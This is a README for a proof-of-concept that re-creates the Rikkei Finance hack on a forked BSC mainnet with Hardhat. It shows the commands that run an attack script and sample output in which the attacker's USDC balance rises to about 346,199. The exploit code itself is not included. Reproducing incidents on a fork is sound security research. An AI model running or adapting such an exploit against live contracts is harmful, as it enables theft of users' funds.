# Rikkei Finance re-hack PoC

## How to run

Install nodejs/npm first

Set up the `forking url` (in `hardhat.config.ts`)

e.g. https://speedy-nodes-nyc.moralis.io/xxxxxxxxxxx/bsc/mainnet/archive (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
npm install
npx hardhat run scripts/attack.ts
```
You will see similar output later
```
USDC balance of attacker: 0.0
Exploiting...
Exploit complete.
USDC balance of attacker: 346199.780826500224370302
```
This means the attack is complete
> The block height of the fork is 16956474


## Link
* https://twitter.com/CertiKAlert/status/1514831117169405953